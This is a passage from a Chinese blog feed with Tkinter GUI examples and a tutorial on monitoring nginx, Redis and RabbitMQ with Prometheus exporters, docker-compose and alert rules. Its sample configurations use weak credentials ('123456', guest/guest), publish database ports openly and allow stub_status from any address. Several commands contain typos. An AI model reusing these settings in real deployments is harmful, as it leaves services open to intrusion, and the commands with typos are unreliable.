1234567891011121314151617181920212223242526272829303132333435363738import tkinter#创建主窗口win = tkinter.Tk()#设置标题win.title(&quot;逸尘&quot;)#设置大小和位置win.geometry(&quot;400x400+200+30&quot;)menubar = tkinter.Menu(win)#菜单menu = tkinter.Menu(menubar, tearoff= False)#给菜单选项添加内容for item in [&quot;Python&quot;,&quot;C&quot;,&quot;C++&quot;,&quot;oc&quot;, &quot;Swift&quot;,&quot;C#&quot;,&quot;shell&quot;,&quot;Java&quot;, &quot;JS&quot;, &quot;PHP&quot;,&quot;汇编&quot;,&quot;NodeJs&quot;,&quot;退出&quot;]: menu.add_command(label=item) if item == &quot;退出&quot;: #添加分隔线 menu.add_separator() menu.add_command(label=item, command=win.quit) else: passmenubar.add_cascade(label=&quot;语言&quot;, menu =menu)def showMenu(event): menubar.post(event.x_root,event.y_root)win.bind(&quot;&lt;Button-3&gt;&quot;,showMenu)win.mainloop() 14,Combobox下拉控件1234567891011121314151617181920212223242526272829import tkinterfrom tkinter import ttk#创建主窗口win = tkinter.Tk()#设置标题win.title(&quot;逸尘&quot;)#设置大小和位置win.geometry(&quot;400x400+200+30&quot;)#绑定变量cv = tkinter.StringVar()com = ttk.Combobox(win,textvariable = cv)com.pack()#设置下拉数据com[&quot;value&quot;] = (&quot;黑龙江&quot;,&quot;吉林&quot;,&quot;辽宁&quot;)#设置默认值com.current(0)def func(envent): print(com.get()) print(cv.get()) print(&quot;yichen is a good man&quot;)#绑定事件com.bind(&quot;&lt;&lt;ComboboxSelected&gt;&gt;&quot;, func)win.mainloop() 15, Frame控件1234567891011121314151617181920212223242526272829303132import tkinter#创建主窗口win = tkinter.Tk()#设置标题win.title(&quot;逸尘&quot;)#设置大小和位置win.geometry(&quot;400x400+200+30&quot;)'''框架控件在屏幕上显示一个矩形区域，多作为容器控件'''frm = tkinter.Frame(win)frm.pack()#leftfrm_1 =tkinter.Frame(frm)tkinter.Label(frm_1, text=&quot;左上&quot;,bg=&quot;pink&quot;).pack(side=tkinter.TOP)tkinter.Label(frm_1, text=&quot;左下&quot;,bg=&quot;blue&quot;).pack(side=tkinter.TOP)frm_1.pack(side= tkinter.LEFT)#Rightfrm_r =tkinter.Frame(frm)tkinter.Label(frm_r, text=&quot;右上&quot;,bg=&quot;red&quot;).pack(side=tkinter.TOP)tkinter.Label(frm_r, text=&quot;右下&quot;,bg=&quot;yellow&quot;).pack(side=tkinter.TOP)frm_r.pack(side= tkinter.RIGHT)win.mainloop() 3，数据显示1,表格数据显示123456789101112131415161718192021222324252627282930313233import tkinterfrom tkinter import ttk#创建主窗口win = tkinter.Tk()#设置标题win.title(&quot;逸尘&quot;)#设置大小和位置win.geometry(&quot;600x400+200+30&quot;)#表格tree = ttk.Treeview(win)tree.pack()#定义列tree[&quot;columns&quot;] =(&quot;姓名&quot;,&quot;年龄&quot;, &quot;身高&quot;, &quot;体重&quot;)#设置列tree.column(&quot;姓名&quot;,width= 100)tree.column(&quot;年龄&quot;,width= 100)tree.column(&quot;身高&quot;,width= 100)tree.column(&quot;体重&quot;,width= 100)#设置表头tree.heading(&quot;姓名&quot;, text=&quot;姓名-name&quot;)tree.heading(&quot;年龄&quot;, text=&quot;年龄-age&quot;)tree.heading(&quot;身高&quot;, text=&quot;身高-height&quot;)tree.heading(&quot;体重&quot;, text=&quot;体重-weight&quot;)#添加数据tree.insert(&quot;&quot;,0,text=&quot;line1&quot;, values=(&quot;路延续&quot;,&quot;29&quot;,&quot;178&quot;,&quot;80&quot;,))tree.insert(&quot;&quot;,1,text=&quot;line2&quot;, values=(&quot;范冰冰&quot;,&quot;29&quot;,&quot;170&quot;,&quot;55&quot;,))tree.insert(&quot;&quot;,2,text=&quot;line3&quot;, values=(&quot;罗总&quot;,&quot;29&quot;,&quot;177&quot;,&quot;67&quot;,))tree.insert(&quot;&quot;,3,text=&quot;line4&quot;, values=(&quot;刘德华&quot;,&quot;29&quot;,&quot;169&quot;,&quot;57&quot;,))win.mainloop() 2,树状数据显示12345678910111213141516171819202122232425262728293031323334import tkinterfrom tkinter import ttk#创建主窗口win = tkinter.Tk()#设置标题win.title(&quot;逸尘&quot;)#设置大小和位置win.geometry(&quot;400x400+200+30&quot;)tree = ttk.Treeview(win)tree.pack()#添加一级树枝treeF1 = tree.insert(&quot;&quot;,0, &quot;中国&quot;, text= &quot;中国Chi&quot;, values=(&quot;F1&quot;))treeF2 = tree.insert(&quot;&quot;,1, &quot;美国&quot;, text= &quot;美国USA&quot;, values=(&quot;F2&quot;))treeF3 = tree.insert(&quot;&quot;,2, &quot;英国&quot;, text= &quot;英国ENG&quot;, values=(&quot;F3&quot;))treeF4 = tree.insert(&quot;&quot;,3, &quot;日本&quot;, text= &quot;日本JP&quot;, values=(&quot;F4&quot;))#二级树枝treeF1_1 =tree.insert(treeF1,0,&quot;黑龙江&quot;,text=&quot;中国黑龙江&quot;, values=&quot;F1_1&quot;)treeF1_2 =tree.insert(treeF1,1,&quot;吉林&quot;,text=&quot;中国吉林&quot;, values=&quot;F1_2&quot;)treeF1_3 =tree.insert(treeF1,2,&quot;辽宁&quot;,text=&quot;中国辽宁&quot;, values=&quot;F1_3&quot;)treeF1_4 =tree.insert(treeF1,3,&quot;北京&quot;,text=&quot;中国北京&quot;, values=&quot;F1_4&quot;)treeF2_1 =tree.insert(treeF2,0,&quot;得克萨斯州&quot;,text=&quot;美国得克萨斯州&quot;, values=&quot;F2_1&quot;)treeF2_2 =tree.insert(treeF2,1,&quot;底特律&quot;,text=&quot;美国底特律&quot;, values=&quot;F2_2&quot;)treeF2_3 =tree.insert(treeF2,2,&quot;纽约&quot;,text=&quot;美国纽约&quot;, values=&quot;F2_3&quot;)treeF2_4 =tree.insert(treeF2,3,&quot;华盛顿&quot;,text=&quot;美国华盛顿&quot;, values=&quot;F2_4&quot;)#三级树枝treeF1_1_1 = tree.insert(treeF1_1, 0, &quot;哈尔滨&quot;, text = &quot;黑龙江哈尔滨&quot;)treeF1_1_2 = tree.insert(treeF1_1,1,&quot;无常&quot;,text = &quot;黑龙江无常&quot;)win.mainloop() 3,绝对布局,相对布局，表格布局1234567891011121314151617181920212223242526272829303132333435363738394041import tkinter#创建主窗口win = tkinter.Tk()#设置标题win.title(&quot;逸尘&quot;)#设置大小和位置win.geometry(&quot;400x400+200+30&quot;)label1 = tkinter.Label(win,text =&quot;good&quot;,bg = &quot;blue&quot;)label2 = tkinter.Label(win,text =&quot;nice&quot;,bg = &quot;red&quot;)label3 = tkinter.Label(win,text =&quot;cool&quot;,bg = &quot;pink&quot;)label3 = tkinter.Label(win,text =&quot;yichen&quot;,bg = &quot;yellow&quot;)#绝对布局 ,窗口的变化对位置没有变化#label1.place(x=10,y = 10)#label2.place(x=50,y = 50)#label3.place(x=100, y = 100)label4 = tkinter.Label(win,text =&quot;good&quot;,bg = &quot;blue&quot;)label5 = tkinter.Label(win,text =&quot;nice&quot;,bg = &quot;red&quot;)label6 = tkinter.Label(win,text =&quot;cool&quot;,bg = &quot;pink&quot;)#相对布局 ,窗体改变对控件有影响#tkinter.BOTH也是Y轴#label4.pack(fill = tkinter.Y,side= tkinter.LEFT)#label5.pack(fill = tkinter.X,side= tkinter.TOP)#label6.pack(fill = tkinter.BOTH,side= tkinter.RIGHT)#表格布局label1.grid(row =0, column=0)label2.grid(row =0, column=1)label3.grid(row =1, column=0)label4.grid(row =1, column=1)win.mainloop() 4，鼠标点击事件 事件 描述 &lt;Bi-Motion&gt; 当鼠标左键被按住在小控件且移动鼠标是事件发生i表示1,2,3 &lt;Button-i&gt; Button-1、Button-2、Button-3表明左键、中间键和右键、当在小控件上单击鼠标左键时，Tkinter 会自动抓到鼠标指针的位置，buttonPressed-i 是Button-i 的代名词 &lt;ButtonRelease-i&gt; 当释放鼠标左键时事件发生 &lt;Double-Button-i&gt; 当双击鼠标左键时事件发生分别对应(1,2,3) &lt;Enter&gt; 当鼠标光标进入小控件时事件发生 &lt;Key&gt; 当单击一个键时事件发生 &lt;Leave&gt; 当鼠标光标离开小控件时事件发生 &lt;Return&gt; 当单击”Enter”键是事件发生，可以将键盘上的任意键(像“A”,”B”,”Up”,”Down”,”Left”,”Right”)和一个事件绑定 &lt;Shift-A&gt; 当单击”Shift-A” 键时事件发生，可以将Alt、Shift和Control和其他键组合 &lt;Triple-Button-i&gt; 当三次单击鼠标左键时事件发生 事件属性 事件属性 描述 char 从键盘输入的和按键事件相关的字符 keycode 从键盘输入的和按键事件相关的键的键代码(即统一码) keysym 从键盘输入的和按键事件相关的键的键符号(即字符) num 按键数字(1,2,3)表明按下的是哪个鼠标键 widget 触发这个事件的小控件对象 x和y 当前鼠标在小控件中以像素为单位的位置 x_root和y_root 当前鼠标相对于屏幕左上角的以像素为单位的位置 123456789101112131415161718192021222324252627282930313233import tkinter#创建主窗口win = tkinter.Tk()#设置标题win.title(&quot;逸尘&quot;)#设置大小和位置win.geometry(&quot;400x400+200+30&quot;)#&lt;Button-1&gt;鼠标左键#&lt;Button-3&gt;鼠标右键#&lt;Button-2&gt; 鼠标中间#当鼠标光标进入小控件是事件发生&lt;Enter&gt;#&lt;Leave&gt;当鼠标光标离开小控件时事件发生#&lt;Triple-Button-i&gt;当三次单击鼠标左键时事件发生i表示1，2,3def func(event): #参考鼠标事件属性，x和y ，输出对于小控件的坐标 print(event.x, event.y)# tkinter.Button换成其他也可以，比如tkinter.Labelbutton1 = tkinter.Button(win, text=&quot;鼠标左键 点击&quot;)#bind 给控件绑定事件#button1.bind(&quot;&lt;Button-1&gt;&quot;,func)#button1.bind(&quot;&lt;Button-3&gt;&quot;,func)#button1.bind(&quot;&lt;Button-2&gt;&quot;,func)button1.bind(&quot;&lt;Key&gt;&quot;,func)#button1.bind(&quot;&lt;Triple-Button-1&gt;&quot;,func)button1.pack()win.mainloop() 5，鼠标移动和释放,进，离开时事件12345678910111213141516171819202122232425262728293031323334353637383940import tkinter#创建主窗口win = tkinter.Tk()#设置标题win.title(&quot;逸尘&quot;)#设置大小和位置win.geometry(&quot;400x400+200+30&quot;)label = tkinter.Label(win,text=&quot;yichen is a good man&quot; ,bg=&quot;red&quot;)label.pack()#鼠标移动事件#&lt;B1-Motion&gt; 鼠标左键移动#&lt;B2-Motion&gt; 鼠标中键移动#&lt;B3-Motion&gt; 鼠标右键移动def func(event): print(event.x,event.y)#label.bind(&quot;&lt;B1-Motion&gt;&quot; ,func)#label.bind(&quot;&lt;B2-Motion&gt;&quot; ,func)#label.bind(&quot;&lt;B3-Motion&gt;&quot; ,func)#鼠标释放事件#&lt;ButtonRelease-1&gt;释放鼠标左键#&lt;ButtonRelease-2&gt;释放鼠标中键#&lt;ButtonRelease-3&gt;释放鼠标右键label.bind(&quot;&lt;ButtonRelease-1&gt;&quot; ,func)#进入事件#&lt;Enter&gt;当鼠标光标进入控件时触发label.bind(&quot;&lt;Enter&gt;&quot; ,func)#鼠标离开控件事件label.bind(&quot;&lt;Leave&gt;&quot; ,func)win.mainloop() 6，响应所有按键和特殊事件1234567891011121314151617181920212223242526272829303132333435363738394041import tkinter#创建主窗口win = tkinter.Tk()#设置标题win.title(&quot;逸尘&quot;)#设置大小和位置win.geometry(&quot;400x400+200+30&quot;)def func(event): #键盘输入什么就显示什么 print(&quot;event.char=&quot;, event.char) print(&quot;你输入的keycode值==&quot;, event.keycode)# tkinter.Button换成其他也可以，比如tkinter.Label#&lt;Key&gt;响应所有的按键#button1 = tkinter.Button(win, text=&quot;响应鼠标所有事件的测试&quot;)label2 = tkinter.Label(win, text=&quot;响应鼠标特殊事件的测试&quot;)#必须设置焦点#button1.focus_set()#button1.bind(&quot;&lt;Key&gt;&quot;,func)#button1.bind(&quot;&lt;Triple-Button-1&gt;&quot;,func)#给主窗口绑定控件可以不用设置焦点#win.bind(&quot;&lt;Key&gt;&quot;,func)#button1.pack()#响应特殊按键事件#&lt;Shift_L&gt; 左shift#&lt;Shift_R&gt; 右shift#&lt;F5&gt;#&lt;Return&gt; 回车#&lt;BackSpace 退格label2.pack()label2.bind(&quot;&lt;Shift_L&gt;&quot;,func)label2.bind(&quot;&lt;Shift_R&gt;&quot;,func)label2.bind(&quot;&lt;Return&gt;&quot;,func)label2.bind(&quot;&lt;BackSpace&gt;&quot;,func)win.mainloop() 7，响应指定按键和组合按键事件123456789101112131415161718192021222324252627282930import tkinter#创建主窗口win = tkinter.Tk()#设置标题win.title(&quot;逸尘&quot;)#设置大小和位置win.geometry(&quot;400x400+200+30&quot;)def func(event): #键盘输入什么就显示什么 print(&quot;event.char=&quot;, event.char) print(&quot;你输入的keycode值==&quot;, event.keycode)#指定awin.bind(&quot;a&quot;,func)#组合按键事件#&lt;Control-Alt-a&gt;&quot;#&lt;Shift-Up&gt;#&lt;Control-p&gt;win.bind(&quot;&lt;Control-p&gt;&quot;,func)win.bind(&quot;&lt;Shift-Up&gt;&quot;,func)win.bind(&quot;&lt;Shift-Up&gt;&quot;,func)win.mainloop()","link":"/2020/08/04/Tkinter%E4%BD%BF%E7%94%A8/"},{"title":"Prometheus监控nginx,redis,rabbitmq,mongodb,docker等","text":"Prometheus监控nginx,redis,rabbitmq,mongodb,docker等。一、环境介绍 主机名 ip地址 系统 说明 localhost 192.168.224.11 centos7.8 docker方式安装Prometheus。 server2.com 192.168.224.12 centos7.8 mongo版本4.2.5,rabbitmq版本3.7.15,redis版本5,nginx版本1.21.6,docker版本23.01 1、环境搭建安装docker和docker-compose a、创建nginx目录12 mkdir /data/nginx/conf.d -pcd /data/nginx/conf.d 在/data/nginx/conf.d目录里面新增加nginx的配置文件 1234567891011121314cat &gt;&gt;server.conf&lt;&lt; &quot;EOF&quot;server { listen 80; server_name localhost; location / { root /usr/share/nginx/html; index index.html index.htm; } error_page 500 502 503 504 /50x.html; location = /50x.html { root /usr/share/nginx/html; }}EOF 检查 1cat server.conf b、docker-compose安装rabbitmq,nginx,mongo,redis12mkdir /data/docker-compose -pcd /data/docker-compose 通过cat 创建docker-compose.yaml⽂件 123456789101112131415161718192021222324252627282930313233343536373839404142434445cat &gt; docker-compose.yaml &lt;&lt;\"EOF\"version: '3'services: redis: image: redis:5 container_name: redis command: redis-server --requirepass 123456 --maxmemory 512mb restart: always volumes: - /data/redis/data:/data ports: - 6379:6379 nginx: image: nginx:1.21.6 container_name: nginx restart: always volumes: - /data/nginx/conf.d:/etc/nginx/conf.d - /data/nginx/html:/usr/share/nginx/html - /data/nginx/log:/var/log/nginx ports: - 80:80 rabbitmq: image: rabbitmq:3.7.15-management container_name: rabbitmq restart: always volumes: - /data/rabbitmq/data:/var/lib/rabbitmq - /data/rabbitmq/log:/var/log/rabbitmq ports: - 5672:5672 - 15672:15672 mongo: image: mongo:4.2.5 container_name: mongo restart: always volumes: - /data/mongo/db:/data/db ports: - 27017:27017 command: [--auth] environment: MONGO_INITDB_ROOT_USERNAME: root MONGO_INITDB_ROOT_PASSWORD: 123456EOF 运行 1docker-compose up -d 检查 1docker ps -a STATUS列全部为up为正常。 二、监控nginxnginx开启stu_status监控nginx需要with-http_stub_status_module 检查是否安装有with-http_stub_status_module模块 1sdocker exec -it nginx nginx -V 2&gt;&amp;1 | grep -o with-http_stub_status_module nginx开启stub_status配置 1234567891011121314cd /data/nginx/conf.dvim server.confserver { .... location /stub_status { stub_status on; access_log off; #allow nginx_export的ip; allow 0.0.0.0/0; deny all; } ....} 检查配置文件 1docker exec -it nginx nginx -t 重新加载配置⽂件 1docker exec -it nginx nginx -s reload 查看 1curl http://192.168.224.12/stub_status 参数解释： Active connections – 活动连接数 accepts – 接收请求数 handled – 成功处理请求数 requests – 总请求数 reding – 正在进⾏读操作的请求数 writing – 正在进⾏写操作的请求数 waiting – 正在等待的请求数 1、二进制安装nginx_exporter1nginx_exporter下载地址: https://github.com/nginxinc/nginx-prometheus-exporter/releases 下载⼆进制包解压并放⼊**/usr/local/Prometheus**⽬录 123456wget https://github.com/nginxinc/nginx-prometheus-exporter/releases/download/v0.11.0/nginx-prometheus-exporter_0.11.0_linux_amd64.tar.gzmkdir /usr/local/Prometheus/nginx_exporter -ptar xvf nginx-prometheus-exporter_0.11.0_linux_amd64.tar.gz -C /usr/local/Prometheus/nginx_exporterls /usr/local/Prometheus/nginx_exporter/ 创建⽤户 1useradd -M -s /usr/sbin/nologin prometheus 更改exporter文件夹权限 1chown prometheus:prometheus -R /usr/local/Prometheus 创建 systemd 服务 nginx_exporter.service 12345678910111213cat &gt; /etc/systemd/system/nginx_exporter.service &lt;&lt;&quot;EOF&quot;[Unit]Description=nginx-prometheus-exporterAfter=network.target[Service]Type=simpleUser=prometheusGroup=prometheusRestart=alwaysExecStart=/usr/local/Prometheus/nginx_exporter/nginx-prometheus-exporter -nginx.scrape-uri=http://192.168.224.12/stub_status[Install]WantedBy=multi-user.targetEOF 启动 nginx_exporter 1234systemctl daemon-reloadsystemctl start nginx_exporter.servicesystemctl enable nginx_exporter.servicesystemctl status nginx_exporter.service 启动不了检查⽇志 1journalctl -u nginx_exporter.service -f 2、docker安装nginx_exporterdocker-compose方式 1cd /data/nginx/ 通过cat创建⽂件 12345678910111213cat &gt;docker-compose.yaml &lt;&lt;EOFversion: '3.3'services: nginx_exporter: image: nginx/nginx-prometheus-exporter:0.11 container_name: nginx_exporter hostname: nginx_exporter command: - '-nginx.scrape-uri=http://192.168.224.12/stub_status' restart: always ports: - \"9113:9113\"EOF 启动 1docker-compose up -d 检查 123docker ps -a或：docker logs -f nginx_exporter 3、参数解释 Environment variable 命令⾏参数 description -nginx.scrape-uri nginx stub_status 复制 4、metrics地址注：安装好Exporter后会暴露⼀个 http://ip:端⼝/metrics 的HTTP服务 名称 地址 nginx_exporter http://192.168.224.12:9113/metrics 5、Prometheus配置配置prometheus去采集（拉取）nginx_exporter的监控样本数据 12345678910cd /data/docker-prometheus#在scrape_configs(搜刮配置):下⾯增加如下配置：cat &gt;&gt; prometheus/prometheus.yml &lt;&lt; &quot;EOF&quot; - job_name: 'nginx_exporter' static_configs: - targets: ['192.168.224.12:9113'] labels: instance: server2.com服务器EOF 重新加载配置 1curl -X POST http://localhost:9090/-/reload 检查 6、常⽤的监控指标1234567nginx_connections_accepted 接收请求数nginx_connections_active 活动连接数nginx_connections_handled 成功处理请求数nginx_connections_reding 正在进⾏读操作的请求数nginx_connections_waiting 正在等待的请求数nginx_connections_writing 正在进⾏写操作的请求数nginx_connections_requests 总请求数 7、添加触发器1cd /data/docker-prometheus 追加以下信息 12345678910111213cat &gt;&gt;prometheus/alert.yml &lt;&lt;&quot;EOF&quot;- name: nginx rules: # 对任何实例超过30秒无法联系的情况发出警报 - alert: NginxDown expr: nginx_up == 0 for: 30s labels: severity: critical annotations: summary: &quot;nginx异常,实例:{{ $labels.instance }}&quot; description: &quot;{{ $labels.job }} nginx已关闭&quot;EOF 检查 1vim prometheus/alert.yml 检查配置 1docker exec -it prometheus promtool check config /etc/prometheus/prometheus.yml 重新加载配置 1curl -X POST http://localhost:9090/-/reload 检查 123http://192.168.224.11:9090/alerts?search=或者http://192.168.224.11:9090/rules 8、dashboardgrafana展示prometheus从nginx_exporter收集到的的数据 1https://grafana.com/grafana/dashboards/12708 直接导入模板即可。后面的效果 三、监控redisredis已经在上面通过docker-compose部署好了 1、二进制安装redis_exporterredis_exporter下载地址 1https://github.com/oliver006/redis_exporter/releases 下载⼆进制包解压并放⼊**/usr/local/Prometheus**⽬录 12345wget https://github.com/oliver006/redis_exporter/releases/download/v1.48.0/redis_exporter-v1.48.0.linux-amd64.tar.gztar xvf redis_exporter-v1.48.0.linux-amd64.tar.gzmv redis_exporter-v1.48.0.linux-amd64 /usr/local/Prometheus/redis_exporter 创建⽤户(前面已经创建了就不用创建了) 1useradd -M -s /usr/sbin/nologin prometheus 更改exporter⽂件夹权限 1chown prometheus:prometheus -R /usr/local/Prometheus/ 创建 systemd 服务 123456789101112131415cat &gt; /etc/systemd/system/redis_exporter.service &lt;&lt;&quot;EOF&quot;[Unit]Description=Prometheus Redis ExporterAfter=network.target[Service]Type=simpleUser=prometheusGroup=prometheusRestart=alwaysExecStart=/usr/local/Prometheus/redis_exporter/redis_exporter \\-redis.addr localhost:6379 \\-redis.password 123456[Install]WantedBy=multi-user.targetEOF 启动 redis_exporter 1234systemctl daemon-reloadsystemctl start redis_exportersystemctl enable redis_exportersystemctl status nredis_exporter 启动不了检查⽇志 1journalctl -u redis_exporter -f 2、docker安装redis_exporterdocker直接运行 1docker run -d --restart=always --name redis_exporter -p 9121:9121 oliver006/redis_exporter --redis.addr redis://192.168.224.12:6379 --redis.password '123456' docker-compose⽅式 1cd /data/redis/ 12345678910111213cat &gt;docker-compose.yaml &lt;&lt;EOFversion: '3.3'services: redis_exporter: image: oliver006/redis_exporter container_name: redis_exporter restart: always environment: REDIS_ADDR: &quot;192.168.224.12:6379&quot; REDIS_PASSWORD: 123456 ports: - &quot;9121:9121&quot;EOF 启动 1docker-compose up -d 检查 123docker ps -a或：docker logs -f redis_exporter 3、参数解释 Environment variable 值 description REDIS_ADDR 192.168.224.12:6379 redis服务器地址，如：ip:6379 REDIS_PASSWORD 123456 redis服务器管理密码 4、metrics地址注：安装好Exporter后会暴露⼀个 http://ip:端⼝/metrics 的HTTP服务 名称 地址 redis_exporter http://192.168.224.12:9121/metrics 5、Prometheus配置配置prometheus去采集（拉取）redis_exporter的监控样本数据 12345678910cd /data/docker-prometheus#在scrape_configs(搜刮配置):下⾯增加如下配置：cat &gt;&gt; prometheus/prometheus.yml &lt;&lt; &quot;EOF&quot; - job_name: 'redis_exporter' static_configs: - targets: ['192.168.224.12:9121'] labels: instance: server2.com服务器EOF 重新加载配置 1curl -X POST http://localhost:9090/-/reload 6、常⽤的监控指标123456789101112redis_up # 服务器是否在线redis_uptime_in_seconds # 运⾏时⻓，单位 srate(redis_cpu_sys_seconds_total[1m]) +rate(redis_cpu_user_seconds_total[1m]) # 占⽤ CPU 核数redis_memory_used_bytes # 占⽤内存量redis_memory_max_bytes # 限制的最⼤内存，如果没限制则为 0delta(redis_net_input_bytes_total[1m]) # ⽹络接收的 bytesdelta(redis_net_output_bytes_total[1m]) # ⽹络发送的 bytesredis_connected_clients # 客户端连接数redis_connected_clients / redis_config_maxclients # 连接数使⽤率redis_rejected_connections_total # 拒绝的客户端连接数redis_connected_slaves # slave 连接数 7、触发器配置Prometheus配置 123456vim prometheus/prometheus.yml# 报警(触发器)配置rule_files: - &quot;alert.yml&quot; - &quot;rules/*.yml&quot; 创建新目录 1mkdir prometheus/rules redis触发器（告警规则） 因为是单机，所以未配置集群的触发器 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253cat &gt;&gt; prometheus/rules/redis.yml &lt;&lt;&quot;EOF&quot;groups: - name: redis rules: - alert: RedisDown expr: redis_up == 0 for: 0m labels: severity: critical annotations: summary: 'Redis Down,实例:{{ $labels.instance }}' description: &quot;Redis实例 is down&quot; - alert: RedisMissingBackup expr: time() - redis_rdb_last_save_timestamp_seconds &gt; 60 * 60 * 24 for: 0m labels: severity: critical annotations: summary: &quot;Redis备份丢失,实例:{{ $labels.instance }}&quot; description: &quot;Redis 24⼩时未备份&quot; - alert: RedisOutOfConfiguredMaxmemory expr: redis_memory_used_bytes / redis_memory_max_bytes * 100 &gt; 90 for: 2m labels: severity: warning annotations: summary: &quot;Redis超出配置的最⼤内存,实例:{{ $labels.instance }}&quot; description: &quot;Redis内存使⽤超过配置最⼤内存的90%&quot; - alert: RedisTooManyConnections expr: redis_connected_clients &gt; 100 for: 2m labels: severity: warning annotations: summary: &quot;Redis连接数过多,实例:{{ $labels.instance }}&quot; description: &quot;Redis当前连接数为： {{ $value }}&quot; - alert: RedisNotEnoughConnections expr: redis_connected_clients &lt; 1 for: 2m labels: severity: warning annotations: summary: &quot;Redis没有⾜够的连接,实例:{{ $labels.instance }}&quot; description: &quot;Redis当前连接数为： {{ $value }}&quot; - alert: RedisRejectedConnections expr: increase(redis_rejected_connections_total[1m]) &gt; 0 for: 0m labels: severity: critical annotations: summary: &quot;Redis有拒绝连接,实例:{{ $labels.instance }}&quot; description: &quot;与Redis 的某些连接被拒绝{{ $value }}&quot;EOF 检查配置 1docker exec -it prometheus promtool check config /etc/prometheus/prometheus.yml 重新加载配置 1curl -X POST http://localhost:9090/-/reload 检查 1http://192.168.224.11:9090/alerts?search= 8、dashboardgrafana展示prometheus从redis_exporter收集到的的数据 1234Redis:https://grafana.com/grafana/dashboards/11835或者https://grafana.com/grafana/dashboards/17507 图⾏展示问题 redis dashbord 内存使⽤图⾏展示有问题，如下图 http://192.168.224.11:9090/graph 查询到 redis_memory_max_bytes 为0，因为redis配置参数 maxmemory 未设置，默认 0 。 解决 1redis增加配置 maxmemory 的值 四、监控rabbitmqrabbitmq已经在安装Nginx时，通过docker-compose部署好了 1、二进制安装rabbitmq_exporterrabbit_exporter下载地址: 1https://github.com/kbudde/rabbitmq_exporter/releases 下载⼆进制包解压并放⼊**/usr/local/Prometheus**⽬录 1234wget https://github.com/kbudde/rabbitmq_exporter/releases/download/v1.0.0-RC19/rabbitmq_exporter_1.0.0-RC19_linux_amd64.tar.gzmkdir /usr/local/Prometheus/rabbitmq_exportertar xzf rabbitmq_exporter_1.0.0-RC19_linux_amd64.tar.gz -C /usr/local/Prometheus/rabbitmq_exporter/ 更改权限 1chown prometheus.prometheus -R /usr/local/Prometheus/ 创建systemd服务 1234567891011121314151617cat &gt; /etc/systemd/system/rabbitmq_exporter.service &lt;&lt;&quot;EOF&quot;[Unit]Description=Prometheus rabbitmq ExporterAfter=network.target[Service]Environment=RABBIT_USER=guestEnvironment=RABBIT_PASSWORD=guestEnvironment=RABBIT_URL=http://localhost:15672OUTPUT_FORMAT=JSONType=simpleUser=prometheusGroup=prometheusRestart=alwaysExecStart=/usr/local/Prometheus/rabbitmq_exporter/rabbitmq_exporter[Install]WantedBy=multi-user.targetEOF 启动 1234systemctl daemon-reloadsystemctl start rabbitmq_exportersystemctl enable rabbitmq_exportersystemctl status rabbitmq_exporter 启动不了检查日志 1journalctl -u rabbitmq_exporter -f 2、docker安装rabbitmq_exporterdocker直接运行 1docker run -d -p 9419:9419 --name rabbitmq_exporter -e RABBIT_URL=http://192.168.224.12:15672 -e RABBIT_USER=guest -e RABBIT_PASSWORD=guest kbudde/rabbitmq-exporter docker-compose方式 1cd /data/rabbitmq/ 12345678910111213141516cat &gt;docker-compose.yaml &lt;&lt;EOFversion: '3.3'services: rabbitmq_exporter: image: kbudde/rabbitmq-exporter container_name: rabbitmq_exporter restart: always environment: RABBIT_URL: &quot;http://192.168.224.12:15672&quot; RABBIT_USER: &quot;guest&quot; RABBIT_PASSWORD: &quot;guest&quot; PUBLISH_PORT: &quot;9419&quot; OUTPUT_FORMAT: &quot;JSON&quot; ports: - &quot;9419:9419&quot;EOF 启动 1docker-compose up -d 检查 1ocker ps -a 3、参数解释 Environment variable default description RABBIT_URL http://127.0.0.1:15672 rabbitMQ管理插件的url(必须以http(s)开头) RABBIT_USER guest rabbitMQ管理插件的用户名 RABBIT_PASSWORD guest rabbitMQ管理插件的密码 OUTPUT_FORMAT JOSN 输出格式 PUBLISH_PORT 9419 运行端口(监听端口) 4、metrics地址注：安装好Exporter后会暴露⼀个 http://ip:端⼝/metrics 的HTTP服务 名称 地址 rabbitmq_exporter http://192.168.224.12:9419/metrics 5、Prometheus配置配置prometheus去采集（拉取）rabbitmq_exporter的监控样本数据 12345678910cd /data/docker-prometheus#在scrape_configs(搜刮配置):下⾯增加如下配置：cat &gt;&gt; prometheus/prometheus.yml &lt;&lt; &quot;EOF&quot; - job_name: 'rabbitmq_exporter' static_configs: - targets: ['192.168.224.12:9419'] labels: instance: server2.com服务器EOF 重新加载配置 1curl -X POST http://localhost:9090/-/reload 6、常⽤的监控指标123456789101112rabbitmq_queue_messages_unacknowledged_global 队列中有未确认的消息总数(未被消费的消息)rabbitmq_node_disk_free_limit 使用磁盘大小rabbitmq_node_disk_free 磁盘总大小rabbit_node_mem_used 使用内存大小rabbit_node_mem_limit 内存总大小rabbitmq_sockets_used 使用sockets数量rabbitmq_sockets_available 可用的sockets总数rabbitmq_fd_used 使用文件描述符的数量rabbitmq_fd_available 可用的文件描述符总数 7、触发器配置Rabbitmq触发器 也是单节点，未配置集群触发器 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455cat &gt;&gt; prometheus/rules/rabbitmq.yml &lt;&lt;&quot;EOF&quot;groups:- name: Rabbitmq rules: - alert: RabbitMQDown expr: rabbitmq_up != 1 labels: severity: High annotations: summary: &quot;Rabbitmq Down,实例:{{ $labels.instance }}&quot; description: &quot;Rabbitmq_exporter连不上RabbitMQ! ! !&quot; - alert: RabbitMQ有未确认消息 expr: rabbitmq_queue_messages_unacknowledged_global &gt; 0 for: 1m labels: severity: critical annotations: summary: &quot;RabbitMQ有未确认消息,实例:{{ $labels.instance }}&quot; description: 'RabbitMQ未确认消息&gt;0,当前值为：{{ $value }}' - alert: RabbitMQ可用磁盘空间不足告警 expr: rabbitmq_node_disk_free_alarm != 0 #expr: rabbitmq_node_disk_free_limit / rabbitmq_node_disk_free *100 &gt; 90 for: 0m labels: severity: critical annotations: summary: &quot;RabbitMQ可用磁盘空间不足,实例:{{ $labels.instance }}&quot; description: &quot;RabbitMQ可用磁盘空间不足，请检查&quot; - alert: RabbitMQ可用内存不足告警 expr: rabbitmq_node_mem_alarm != 0 #expr: rabbitmq_node_mem_used / rabbitmq_node_mem_limit * 100 &gt; 90 for: 0m labels: severity: critical annotations: summary: &quot;RabbitMQ可用内存不足,实例:{{ $labels.instance }}&quot; description: &quot;RabbitMQ可用内存不足，请检查&quot; - alert: RabbitMQ_socket连接数使用过高告警 expr: rabbitmq_sockets_used / rabbitmq_sockets_available * 100 &gt; 60 for: 0m labels: 